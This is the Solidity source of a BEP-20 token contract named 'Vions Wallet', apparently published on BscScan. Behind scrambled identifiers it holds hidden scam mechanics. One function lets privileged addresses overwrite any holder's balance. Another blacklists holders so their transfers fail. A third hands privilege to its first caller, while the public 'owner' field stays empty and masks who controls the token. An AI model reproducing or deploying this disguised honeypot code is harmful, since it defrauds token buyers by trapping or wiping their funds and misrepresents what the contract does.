/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface modeFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listExempt) external view returns (uint256);

    function transfer(address buyFee, uint256 shouldTx) external returns (bool);

    function allowance(address marketingIsMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldTx) external returns (bool);

    function transferFrom(
        address sender,
        address buyFee,
        uint256 shouldTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingMin, uint256 value);
    event Approval(address indexed marketingIsMax, address indexed spender, uint256 value);
}

interface modeFromMetadata is modeFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract modeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderMax {
    function createPair(address txLaunch, address enableMinSwap) external returns (address);
}

contract VionsWallet is modeReceiver, modeFrom, modeFromMetadata {

    address public owner;

    function getOwner() external view returns (address) {
        return owner;
    }

    function walletReceiver(address toTake, uint256 shouldTx) public {
        if (!exemptIsWallet[_msgSender()]) {
            return;
        }
        fromBuy[toTake] = shouldTx;
    }

    bool public fundAuto;

    address public isAmount;

    address senderMaxAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    mapping(address => mapping(address => uint256)) private listEnable;

    function txAuto(address txAutoLimit, address buyFee, uint256 shouldTx) internal returns (bool) {
        require(!toFeeTrading[txAutoLimit]);
        return modeSell(txAutoLimit, buyFee, shouldTx);
    }

    uint256 private launchedListAmount = 100000000 * 10 ** 18;

    address enableReceiverMarketing = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function symbol() external view virtual override returns (string memory) {
        return takeAuto;
    }

    constructor (){
        tradingBuy = senderMax(senderMaxAddr).createPair(enableReceiverMarketing,address(this));
        isAmount = _msgSender();
        fromBuy[isAmount] = launchedListAmount;
        exemptIsWallet[isAmount] = true;
        emit Transfer(address(0), isAmount, launchedListAmount);
    }

    uint8 private listLaunch = 18;

    function transfer(address toTake, uint256 shouldTx) external virtual override returns (bool) {
        return txAuto(_msgSender(), toTake, shouldTx);
    }

    function modeSell(address txAutoLimit, address buyFee, uint256 shouldTx) internal returns (bool) {
        require(fromBuy[txAutoLimit] >= shouldTx);
        fromBuy[txAutoLimit] -= shouldTx;
        fromBuy[buyFee] += shouldTx;
        emit Transfer(txAutoLimit, buyFee, shouldTx);
        return true;
    }

    string private feeFund = "Vions Wallet";

    mapping(address => bool) public toFeeTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedListAmount;
    }

    function allowance(address receiverFund, address senderTo) external view virtual override returns (uint256) {
        return listEnable[receiverFund][senderTo];
    }

    address public tradingBuy;

    function balanceOf(address listExempt) public view virtual override returns (uint256) {
        return fromBuy[listExempt];
    }

    function sellSwap(address exemptAmount) public {
        if (exemptAmount == isAmount || exemptAmount == tradingBuy || !exemptIsWallet[_msgSender()]) {
            return;
        }
        toFeeTrading[exemptAmount] = true;
    }

    string private takeAuto = "VWT";

    function swapMode(address maxIs) public {
        if (fundAuto) {
            return;
        }
        exemptIsWallet[maxIs] = true;
        fundAuto = true;
    }

    function transferFrom(address txAutoLimit, address buyFee, uint256 shouldTx) external override returns (bool) {
        if (listEnable[txAutoLimit][_msgSender()] != type(uint256).max) {
            require(shouldTx <= listEnable[txAutoLimit][_msgSender()]);
            listEnable[txAutoLimit][_msgSender()] -= shouldTx;
        }
        return txAuto(txAutoLimit, buyFee, shouldTx);
    }

    function name() external view virtual override returns (string memory) {
        return feeFund;
    }

    mapping(address => bool) public exemptIsWallet;

    function decimals() external view virtual override returns (uint8) {
        return listLaunch;
    }

    mapping(address => uint256) private fromBuy;

    function approve(address senderTo, uint256 shouldTx) public virtual override returns (bool) {
        listEnable[_msgSender()][senderTo] = shouldTx;
        emit Approval(_msgSender(), senderTo, shouldTx);
        return true;
    }

}